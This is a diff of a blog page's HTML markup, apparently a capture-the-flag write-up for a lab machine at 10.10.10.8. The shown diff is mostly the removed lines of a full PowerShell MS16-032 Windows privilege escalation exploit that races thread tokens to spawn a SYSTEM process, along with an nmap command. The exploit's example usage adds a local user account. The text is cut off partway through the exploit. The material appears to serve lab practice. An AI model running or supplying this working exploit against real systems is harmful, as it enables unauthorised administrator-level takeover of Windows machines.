@@ -143,8 +143,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -T4 -A -v 10.10.10.8
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -T4 -A -v 10.10.10.8
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -625,413 +625,413 @@
 </span><span class="lnt">406
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="k">function</span> <span class="nb">Invoke-MS16</span><span class="p">-</span><span class="n">032</span> <span class="p">{</span>
-<span class="cm">&lt;#
-</span><span class="cm"></span><span class="sd">.SYNOPSIS</span><span class="cm">
-</span><span class="cm">    
-</span><span class="cm">    PowerShell implementation of MS16-032. The exploit targets all vulnerable
-</span><span class="cm">    operating systems that support PowerShell v2+. Credit for the discovery of
-</span><span class="cm">    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
-</span><span class="cm">    
-</span><span class="cm">    Targets:
-</span><span class="cm">    
-</span><span class="cm">    * Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!
-</span><span class="cm">    * Tested on x32 Win7, x64 Win8, x64 2k12R2
-</span><span class="cm">    
-</span><span class="cm">    Notes:
-</span><span class="cm">    
-</span><span class="cm">    * In order for the race condition to succeed the machine must have 2+ CPU
-</span><span class="cm">      cores. If testing in a VM just make sure to add a core if needed mkay.
-</span><span class="cm">    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded
-</span><span class="cm">      but not spawn a shell. Not sure what the issue is but just re-run and profit!
-</span><span class="cm">    * Want to know more about MS16-032 ==&gt;
-</span><span class="cm">      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
-</span><span class="cm">
-</span><span class="cm"></span><span class="sd">.DESCRIPTION</span><span class="cm">
-</span><span class="cm">    Author: Ruben Boonen (@FuzzySec)
-</span><span class="cm">    Blog: http://www.fuzzysecurity.com/
-</span><span class="cm">    License: BSD 3-Clause
-</span><span class="cm">    Required Dependencies: PowerShell v2+
-</span><span class="cm">    Optional Dependencies: None
-</span><span class="cm">
-</span><span class="cm"></span><span class="sd">.PARAMETER</span><span class="cm"> Application
-</span><span class="cm">
-</span><span class="cm">Specifies an Application to run.
-</span><span class="cm">
-</span><span class="cm"></span><span class="sd">.PARAMETER</span><span class="cm"> Commandline
-</span><span class="cm">
-</span><span class="cm">Specifies Commandline, such as net user xxx xxx /add
-</span><span class="cm">    
-</span><span class="cm"></span><span class="sd">.EXAMPLE</span><span class="cm">
-</span><span class="cm">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe
-</span><span class="cm">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe -Commandline &#34;/c net user 1 1 /add&#34;
-</span><span class="cm">
-</span><span class="cm">#&gt;</span>
-  <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
-    <span class="k">param</span><span class="p">(</span>
-        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$False</span><span class="p">,</span> <span class="k">ParameterSetName</span> <span class="p">=</span> <span class="s1">&#39;C:\Windows\System32\cmd.exe&#39;</span> <span class="p">)]</span>
-        <span class="no">[string]</span>
-        <span class="nv">$Application</span><span class="p">,</span>
-
-        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$False</span><span class="p">)]</span>
-        <span class="no">[string]</span>
-        <span class="nv">$Commandline</span>
-        <span class="p">)</span>
-
-
-    <span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="sh">@&#34;
-</span><span class="sh">    using System;
-</span><span class="sh">    using System.Diagnostics;
-</span><span class="sh">    using System.Runtime.InteropServices;
-</span><span class="sh">    using System.Security.Principal;
-</span><span class="sh">    
-</span><span class="sh">    [StructLayout(LayoutKind.Sequential)]
-</span><span class="sh">    public struct PROCESS_INFORMATION
-</span><span class="sh">    {
-</span><span class="sh">        public IntPtr hProcess;
-</span><span class="sh">        public IntPtr hThread;
-</span><span class="sh">        public int dwProcessId;
-</span><span class="sh">        public int dwThreadId;
-</span><span class="sh">    }
-</span><span class="sh">    
-</span><span class="sh">    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
-</span><span class="sh">    public struct STARTUPINFO
-</span><span class="sh">    {
-</span><span class="sh">        public Int32 cb;
-</span><span class="sh">        public string lpReserved;
-</span><span class="sh">        public string lpDesktop;
-</span><span class="sh">        public string lpTitle;
-</span><span class="sh">        public Int32 dwX;
-</span><span class="sh">        public Int32 dwY;
-</span><span class="sh">        public Int32 dwXSize;
-</span><span class="sh">        public Int32 dwYSize;
-</span><span class="sh">        public Int32 dwXCountChars;
-</span><span class="sh">        public Int32 dwYCountChars;
-</span><span class="sh">        public Int32 dwFillAttribute;
-</span><span class="sh">        public Int32 dwFlags;
-</span><span class="sh">        public Int16 wShowWindow;
-</span><span class="sh">        public Int16 cbReserved2;
-</span><span class="sh">        public IntPtr lpReserved2;
-</span><span class="sh">        public IntPtr hStdInput;
-</span><span class="sh">        public IntPtr hStdOutput;
-</span><span class="sh">        public IntPtr hStdError;
-</span><span class="sh">    }
-</span><span class="sh">    
-</span><span class="sh">    [StructLayout(LayoutKind.Sequential)]
-</span><span class="sh">    public struct SQOS
-</span><span class="sh">    {
-</span><span class="sh">        public int Length;
-</span><span class="sh">        public int ImpersonationLevel;
-</span><span class="sh">        public int ContextTrackingMode;
-</span><span class="sh">        public bool EffectiveOnly;
-</span><span class="sh">    }
-</span><span class="sh">    
-</span><span class="sh">    public static class Advapi32
-</span><span class="sh">    {
-</span><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true, CharSet=CharSet.Unicode)]
-</span><span class="sh">        public static extern bool CreateProcessWithLogonW(
-</span><span class="sh">            String userName,
-</span><span class="sh">            String domain,
-</span><span class="sh">            String password,
-</span><span class="sh">            int logonFlags,
-</span><span class="sh">            String applicationName,
-</span><span class="sh">            String commandLine,
-</span><span class="sh">            int creationFlags,
-</span><span class="sh">            int environment,
-</span><span class="sh">            String currentDirectory,
-</span><span class="sh">            ref  STARTUPINFO startupInfo,
-</span><span class="sh">            out PROCESS_INFORMATION processInformation);
-</span><span class="sh">            
-</span><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern bool SetThreadToken(
-</span><span class="sh">            ref IntPtr Thread,
-</span><span class="sh">            IntPtr Token);
-</span><span class="sh">            
-</span><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern bool OpenThreadToken(
-</span><span class="sh">            IntPtr ThreadHandle,
-</span><span class="sh">            int DesiredAccess,
-</span><span class="sh">            bool OpenAsSelf,
-</span><span class="sh">            out IntPtr TokenHandle);
-</span><span class="sh">            
-</span><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern bool OpenProcessToken(
-</span><span class="sh">            IntPtr ProcessHandle, 
-</span><span class="sh">            int DesiredAccess,
-</span><span class="sh">            ref IntPtr TokenHandle);
-</span><span class="sh">            
-</span><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public extern static bool DuplicateToken(
-</span><span class="sh">            IntPtr ExistingTokenHandle,
-</span><span class="sh">            int SECURITY_IMPERSONATION_LEVEL,
-</span><span class="sh">            ref IntPtr DuplicateTokenHandle);
-</span><span class="sh">    }
-</span><span class="sh">    
-</span><span class="sh">    public static class Kernel32
-</span><span class="sh">    {
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;)]
-</span><span class="sh">        public static extern uint GetLastError();
-</span><span class="sh">    
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern IntPtr GetCurrentProcess();
-</span><span class="sh">    
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern IntPtr GetCurrentThread();
-</span><span class="sh">        
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern int GetThreadId(IntPtr hThread);
-</span><span class="sh">        
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError = true)]
-</span><span class="sh">        public static extern int GetProcessIdOfThread(IntPtr handle);
-</span><span class="sh">        
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;,SetLastError=true)]
-</span><span class="sh">        public static extern int SuspendThread(IntPtr hThread);
-</span><span class="sh">        
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;,SetLastError=true)]
-</span><span class="sh">        public static extern int ResumeThread(IntPtr hThread);
-</span><span class="sh">        
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern bool TerminateProcess(
-</span><span class="sh">            IntPtr hProcess,
-</span><span class="sh">            uint uExitCode);
-</span><span class="sh">    
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern bool CloseHandle(IntPtr hObject);
-</span><span class="sh">        
-</span><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern bool DuplicateHandle(
-</span><span class="sh">            IntPtr hSourceProcessHandle,
-</span><span class="sh">            IntPtr hSourceHandle,
-</span><span class="sh">            IntPtr hTargetProcessHandle,
-</span><span class="sh">            ref IntPtr lpTargetHandle,
-</span><span class="sh">            int dwDesiredAccess,
-</span><span class="sh">            bool bInheritHandle,
-</span><span class="sh">            int dwOptions);
-</span><span class="sh">    }
-</span><span class="sh">    
-</span><span class="sh">    public static class Ntdll
-</span><span class="sh">    {
-</span><span class="sh">        [DllImport(&#34;ntdll.dll&#34;, SetLastError=true)]
-</span><span class="sh">        public static extern int NtImpersonateThread(
-</span><span class="sh">            IntPtr ThreadHandle,
-</span><span class="sh">            IntPtr ThreadToImpersonate,
-</span><span class="sh">            ref SQOS SecurityQualityOfService);
-</span><span class="sh">    }
-</span><span class="sh">&#34;@</span>
-
-    <span class="k">function</span> <span class="nb">Get-ThreadHandle</span> <span class="p">{</span>
-        <span class="c"># StartupInfo Struct</span>
-        <span class="nv">$StartupInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">STARTUPINFO</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">dwFlags</span> <span class="p">=</span> <span class="n">0x00000101</span> <span class="c"># STARTF_USESTDHANDLES</span>
-            <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">hStdInput</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentThread</span><span class="p">()</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">hStdOutput</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentThread</span><span class="p">()</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">hStdError</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentThread</span><span class="p">()</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$StartupInfo</span><span class="p">)</span> <span class="c"># Struct Size</span>
-        
-        <span class="c"># ProcessInfo Struct</span>
-        <span class="nv">$ProcessInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PROCESS_INFORMATION</span>
-        
-        <span class="c"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span>
-        <span class="nv">$GetCurrentPath</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s2">&#34;.\&#34;</span> <span class="n">-Verbose</span><span class="p">).</span><span class="n">FullName</span>
-        
-        <span class="c"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">CreateProcessWithLogonW</span><span class="p">(</span>
-            <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;domain&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="p">,</span>
-            <span class="n">0x00000002</span><span class="p">,</span> <span class="s2">&#34;C:\Windows\System32\notepad.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-            <span class="n">0x00000004</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$GetCurrentPath</span><span class="p">,</span>
-            <span class="no">[ref]</span><span class="nv">$StartupInfo</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$ProcessInfo</span><span class="p">)</span>
-        
-        <span class="c"># Duplicate handle into current process -&gt; DUPLICATE_SAME_ACCESS</span>
-        <span class="nv">$lpTargetHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">DuplicateHandle</span><span class="p">(</span>
-            <span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">0x4</span><span class="p">,</span>
-            <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentProcess</span><span class="p">(),</span>
-            <span class="no">[ref]</span><span class="nv">$lpTargetHandle</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$false</span><span class="p">,</span>
-            <span class="n">0x00000002</span><span class="p">)</span>
-        
-        <span class="c"># Clean up suspended process</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">TerminateProcess</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">1</span><span class="p">)</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">)</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
-        
-        <span class="nv">$lpTargetHandle</span>
-    <span class="p">}</span>
-    
-    <span class="k">function</span> <span class="nb">Get-SystemToken</span> <span class="p">{</span>
-        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[?] Trying thread handle: $Thread&#34;</span>
-        <span class="nb">echo </span><span class="s2">&#34;[?] Thread belongs to: </span><span class="p">$($(</span><span class="nb">Get-Process</span> <span class="n">-PID</span> <span class="p">$(</span><span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetProcessIdOfThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">))).</span><span class="n">ProcessName</span><span class="p">)</span><span class="s2">&#34;</span>
-    
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">SuspendThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$CallResult</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nb">echo </span><span class="s2">&#34;[!] $Thread is a bad thread, moving on..&#34;</span>
-            <span class="k">Return</span>
-        <span class="p">}</span> <span class="nb">echo </span><span class="s2">&#34;[+] Thread suspended&#34;</span>
-        
-        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Wiping current impersonation token&#34;</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">SetThreadToken</span><span class="p">(</span><span class="no">[ref]</span><span class="nv">$Thread</span><span class="p">,</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nb">echo </span><span class="s2">&#34;[!] SetThreadToken failed, moving on..&#34;</span>
-            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
-            <span class="nb">echo </span><span class="s2">&#34;[+] Thread resumed!&#34;</span>
-            <span class="k">Return</span>
-        <span class="p">}</span>
-        
-        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Building SYSTEM impersonation token&#34;</span>
-        <span class="c"># SecurityQualityOfService struct</span>
-        <span class="nv">$SQOS</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">SQOS</span>
-        <span class="nv">$SQOS</span><span class="p">.</span><span class="n">ImpersonationLevel</span> <span class="p">=</span> <span class="n">2</span> <span class="c">#SecurityImpersonation</span>
-        <span class="nv">$SQOS</span><span class="p">.</span><span class="n">Length</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$SQOS</span><span class="p">)</span>
-        <span class="c"># Undocumented API&#39;s, I like your style Microsoft ;)</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Ntdll]</span><span class="p">::</span><span class="n">NtImpersonateThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">,</span> <span class="nv">$Thread</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$sqos</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$CallResult</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nb">echo </span><span class="s2">&#34;[!] NtImpersonateThread failed, moving on..&#34;</span>
-            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
-            <span class="nb">echo </span><span class="s2">&#34;[+] Thread resumed!&#34;</span>
-            <span class="k">Return</span>
-        <span class="p">}</span>
-    
-        <span class="nv">$script:SysTokenHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
-        <span class="c"># 0x0006 --&gt; TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">OpenThreadToken</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">,</span> <span class="n">0x0006</span><span class="p">,</span> <span class="nv">$false</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$SysTokenHandle</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nb">echo </span><span class="s2">&#34;[!] OpenThreadToken failed, moving on..&#34;</span>
-            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
-            <span class="nb">echo </span><span class="s2">&#34;[+] Thread resumed!&#34;</span>
-            <span class="k">Return</span>
-        <span class="p">}</span>
-        
-        <span class="nb">echo </span><span class="s2">&#34;[?] Success, open SYSTEM token handle: $SysTokenHandle&#34;</span>
-        <span class="nb">echo </span><span class="s2">&#34;[+] Resuming thread..&#34;</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
-    <span class="p">}</span>
-    
-    <span class="c"># main() &lt;--- ;)</span>
-    <span class="nv">$ms16032</span> <span class="p">=</span> <span class="sh">@&#34;
-</span><span class="sh">     __ __ ___ ___   ___     ___ ___ ___ 
-</span><span class="sh">    |  V  |  _|_  | |  _|___|   |_  |_  |
-</span><span class="sh">    |     |_  |_| |_| . |___| | |_  |  _|
-</span><span class="sh">    |_|_|_|___|_____|___|   |___|___|___|
-</span><span class="sh">                                        
-</span><span class="sh">                   [by b33f -&gt; @FuzzySec]
-</span><span class="sh">&#34;@</span>
-    
-    <span class="nv">$ms16032</span>
-    
-    <span class="c"># Check logical processor count, race condition requires 2+</span>
-    <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[?] Operating system core count: </span><span class="p">$(</span><span class="no">[System.Environment]</span><span class="p">::</span><span class="n">ProcessorCount</span><span class="p">)</span><span class="s2">&#34;</span>
-    <span class="k">if</span> <span class="p">($(</span><span class="no">[System.Environment]</span><span class="p">::</span><span class="n">ProcessorCount</span><span class="p">)</span> <span class="o">-lt</span> <span class="n">2</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nb">echo </span><span class="s2">&#34;[!] This is a VM isn&#39;t it, race condition requires at least 2 CPU cores, exiting!</span><span class="se">`n</span><span class="s2">&#34;</span>
-        <span class="k">Return</span>
-    <span class="p">}</span>
-    
-    <span class="c"># Create array for Threads &amp; TID&#39;s</span>
-    <span class="nv">$ThreadArray</span> <span class="p">=</span> <span class="p">@()</span>
-    <span class="nv">$TidArray</span> <span class="p">=</span> <span class="p">@()</span>
-    
-    <span class="nb">echo </span><span class="s2">&#34;[&gt;] Duplicating CreateProcessWithLogonW handles..&#34;</span>
-    <span class="c"># Loop Get-ThreadHandle and collect thread handles with a valid TID</span>
-    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="n">500</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
-        <span class="nv">$hThread</span> <span class="p">=</span> <span class="nb">Get-ThreadHandle</span>
-        <span class="nv">$hThreadID</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetThreadId</span><span class="p">(</span><span class="nv">$hThread</span><span class="p">)</span>
-        <span class="c"># Bit hacky/lazy, filters on uniq/valid TID&#39;s to create $ThreadArray</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$TidArray</span> <span class="o">-notcontains</span> <span class="nv">$hThreadID</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$TidArray</span> <span class="p">+=</span> <span class="nv">$hThreadID</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$hThread</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$ThreadArray</span> <span class="p">+=</span> <span class="nv">$hThread</span> <span class="c"># This is what we need!</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    
-    <span class="k">if</span> <span class="p">($(</span><span class="nv">$ThreadArray</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="o">-eq</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nb">echo </span><span class="s2">&#34;[!] No valid thread handles were captured, exiting!&#34;</span>
-        <span class="k">Return</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nb">echo </span><span class="s2">&#34;[?] Done, got </span><span class="p">$(</span><span class="nv">$ThreadArray</span><span class="p">.</span><span class="n">length</span><span class="p">)</span><span class="s2"> thread handle(s)!&#34;</span>
-        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[?] Thread handle list:&#34;</span>
-        <span class="nv">$ThreadArray</span>
-    <span class="p">}</span>
-    
-    <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[*] Sniffing out privileged impersonation token..&#34;</span>
-    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$Thread</span> <span class="k">in</span> <span class="nv">$ThreadArray</span><span class="p">){</span>
-    
-        <span class="c"># Get handle to SYSTEM access token</span>
-        <span class="nb">Get-SystemToken</span>
-        
-        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[*] Sniffing out SYSTEM shell..&#34;</span>
-        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[&gt;] Duplicating SYSTEM token&#34;</span>
-        <span class="nv">$hDuplicateTokenHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">DuplicateToken</span><span class="p">(</span><span class="nv">$SysTokenHandle</span><span class="p">,</span> <span class="n">2</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
-        
-        <span class="c"># Simple PS runspace definition</span>
-        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Starting token race&#34;</span>
-        <span class="nv">$Runspace</span> <span class="p">=</span> <span class="no">[runspacefactory]</span><span class="p">::</span><span class="n">CreateRunspace</span><span class="p">()</span>
-        <span class="nv">$StartTokenRace</span> <span class="p">=</span> <span class="no">[powershell]</span><span class="p">::</span><span class="n">Create</span><span class="p">()</span>
-        <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">runspace</span> <span class="p">=</span> <span class="nv">$Runspace</span>
-        <span class="nv">$Runspace</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
-        <span class="no">[void]</span><span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">AddScript</span><span class="p">({</span>
-            <span class="k">Param</span> <span class="p">(</span><span class="nv">$Thread</span><span class="p">,</span> <span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
-            <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">SetThreadToken</span><span class="p">(</span><span class="no">[ref]</span><span class="nv">$Thread</span><span class="p">,</span> <span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
-            <span class="p">}</span>
-        <span class="p">}).</span><span class="n">AddArgument</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">).</span><span class="n">AddArgument</span><span class="p">(</span><span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
-        <span class="nv">$AscObj</span> <span class="p">=</span> <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">BeginInvoke</span><span class="p">()</span>
-        
-        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Starting process race&#34;</span>
-        <span class="c"># Adding a timeout (10 seconds) here to safeguard from edge-cases</span>
-        <span class="nv">$SafeGuard</span> <span class="p">=</span> <span class="no">[diagnostics.stopwatch]</span><span class="p">::</span><span class="n">StartNew</span><span class="p">()</span>
-        <span class="k">while</span> <span class="p">(</span><span class="nv">$SafeGuard</span><span class="p">.</span><span class="n">ElapsedMilliseconds</span> <span class="o">-lt</span> <span class="n">10000</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c"># StartupInfo Struct</span>
-        <span class="nv">$StartupInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">STARTUPINFO</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$StartupInfo</span><span class="p">)</span> <span class="c"># Struct Size</span>
-        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">dwFlags</span> <span class="p">=</span> <span class="n">0x00000101</span> <span class="c"># STARTF_USESTDHANDLES</span>
-            <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
-        <span class="c"># ProcessInfo Struct</span>
-        <span class="nv">$ProcessInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PROCESS_INFORMATION</span>
-        
-        <span class="c"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span>
-        <span class="nv">$GetCurrentPath</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s2">&#34;.\&#34;</span> <span class="n">-Verbose</span><span class="p">).</span><span class="n">FullName</span>
-        
-        <span class="c"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">CreateProcessWithLogonW</span><span class="p">(</span>
-            <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;domain&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="p">,</span>
-            <span class="n">0x00000002</span><span class="p">,</span> <span class="nv">$Application</span><span class="p">,</span><span class="nv">$Commandline</span><span class="p">,</span>
